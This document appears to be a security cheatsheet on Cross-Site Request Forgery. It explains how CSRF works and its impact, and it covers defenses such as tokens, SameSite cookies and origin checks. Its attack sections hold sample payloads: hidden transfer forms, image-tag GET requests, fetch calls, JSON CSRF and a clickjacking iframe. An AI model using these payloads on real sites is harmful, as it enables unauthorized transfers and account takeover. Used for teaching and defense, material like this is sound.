
# 🔥 CSRF (Cross-Site Request Forgery) Cheatsheet

## 🎯 What is CSRF?

Cross-Site Request Forgery (CSRF) is a web security vulnerability that allows attackers to trick a user into performing unwanted actions on a website where they are authenticated.

- **Key Feature:** Exploits the trust a web application places in the user’s browser.
- **Target Actions:**
  - Changing user details.
  - Transferring funds.
  - Changing account settings.
  - Making unauthorized purchases.

---

## 💣 Impact of a CSRF Attack

- **Account Takeover:**
  - Attackers can modify account credentials, including passwords or email addresses.
- **Unauthorized Transactions:**
  - Transfer funds, purchase items, or execute sensitive operations tied to user credentials.
- **Privilege Escalation:**
  - If administrators are targeted, CSRF can be used to change settings or create privileged accounts.
- **Data Exposure or Manipulation:**
  - CSRF can alter or delete sensitive data on behalf of the victim.

---

## 🔍 How Does CSRF Work?

1. **User Authentication:**
   - Victim is logged into a web application and has an active session (cookies or tokens).
2. **Malicious Request Crafted:**
   - Attacker creates a request to perform an action on the target application.
3. **User Tricked into Triggering the Request:**
   - Delivered via phishing emails, hidden forms, or embedded scripts.
4. **Request Executed on Target Site:**
   - Browser automatically includes session cookies, and the server processes it as if it originated from the victim.

---

## 🛠️ Constructing a CSRF Attack

### Example: Unauthorized Money Transfer

#### Targeted Functionality:
```http
POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded

amount=1000&to_account=attacker_account
```

#### Malicious HTML Form:
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="attacker_account">
  <input type="submit" value="Click Here">
</form>
```

#### Delivery to the Victim:
- Link the malicious form on a webpage or trick the user into clicking via social engineering.

---

## 🔑 Common Defenses Against CSRF

1. **CSRF Tokens**
   - Unique, unguessable values included in sensitive requests.
   - **Implementation Example (PHP):**
     ```php
     // Generate CSRF token
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
     ?>
     <form method="POST">
       <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
     </form>
     ```
   - **Validation:**
     ```php
     if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
         die("CSRF validation failed.");
     }
     ```

2. **SameSite Cookies**
   - Restrict cookies from being sent with cross-site requests.
   - **Options:**
     - `Strict`: Cookies sent only for same-origin requests.
     - `Lax`: Allows cookies for top-level navigation and GET requests.
   - **Example:**
     ```http
     Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
     ```

3. **Referer and Origin Header Validation**
   - Validate headers in sensitive requests to ensure trusted origins.
   - **Example:**
     ```php
     $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
     if ($origin !== 'https://trusted-site.com') {
         die("Invalid origin.");
     }
     ```

4. **Custom Headers**
   - Require requests to include a custom header:
     ```javascript
     fetch('/transfer', {
         method: 'POST',
         headers: { 'X-CSRF-Token': csrfToken },
         body: JSON.stringify({ amount: 1000 })
     });
     ```

---

## 🔓 Common Flaws in CSRF Defenses

- **Token Validation Issues:**
  - Tokens validated only for presence, not correctness.
- **Tokens Not Tied to Sessions:**
  - Tokens reused across sessions are vulnerable.
- **Tokens Stored in Cookies:**
  - Susceptible to CSRF as browsers include cookies automatically.
- **SameSite Cookie Bypasses:**
  - **Bypassing Lax Mode:**
    - Use GET requests for operations allowed by Lax cookies.
  - **On-Site Gadgets:**
    - Leverage vulnerable endpoints reflecting input back to attackers.

---

## 🛠️ Delivering a CSRF Exploit

### Methods:
1. **Hidden Forms:**
   ```html
   <form action="https://target.com/transfer" method="POST">
     <input type="hidden" name="amount" value="1000">
     <input type="hidden" name="to_account" value="attacker_account">
   </form>
   ```

2. **GET Requests in URLs:**
   ```html
   <img src="https://target.com/transfer?amount=1000&to_account=attacker_account">
   ```

3. **JavaScript Requests:**
   ```javascript
   fetch('https://target.com/transfer', {
       method: 'POST',
       body: 'amount=1000&to_account=attacker_account'
   });
   ```

---

## 🚨 Advanced CSRF Exploit Techniques

### 1. Bypassing SameSite Restrictions
- Use timing and redirection gadgets.
- Example:
  - Exploit sibling domains sharing cookies by redirecting users between them.

### 2. On-Site Gadget Exploitation
- Exploit endpoints that reflect input:
  ```javascript
  fetch('https://target.com/redirect?url=https://malicious-site.com');
  ```

### 3. JSON CSRF
- Exploit JSON-based endpoints that lack proper CSRF protection:
  ```javascript
  fetch('https://target.com/json/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: 1000, to_account: 'attacker_account' })
  });
  ```

### 4. Clickjacking + CSRF
- Combine CSRF with clickjacking to trick users into clicking hidden buttons:
  ```html
  <iframe src="https://target.com/transfer" style="opacity: 0; position: absolute;"></iframe>
  ```

---

## 🛠️ Tools for CSRF Testing

| **Tool**        | **Purpose**                       | **URL**      |
|------------------|-----------------------------------|--------------|
| Burp Suite       | Manual CSRF vulnerability testing | [Burp Suite](https://portswigger.net/burp) |
| OWASP ZAP        | Automated CSRF scan              | [ZAP](https://owasp.org/www-project-zap/) |
| Postman          | Token validation testing         | [Postman](https://www.postman.com/) |
